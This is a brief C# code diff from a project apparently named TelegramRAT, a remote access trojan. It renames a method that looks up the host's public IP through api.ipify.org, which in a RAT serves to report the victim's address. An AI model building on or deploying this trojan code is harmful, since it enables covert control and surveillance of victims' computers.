@@ -34,7 +34,7 @@ namespace TelegramRAT
 
         }
 
-        public static async Task<string> GetIpAddress()
+        public static async Task<string> GetIpAddressAsync()
         {
             HttpClient client = new HttpClient();
             string ip = await client.GetStringAsync("https://api.ipify.org/?format=json");
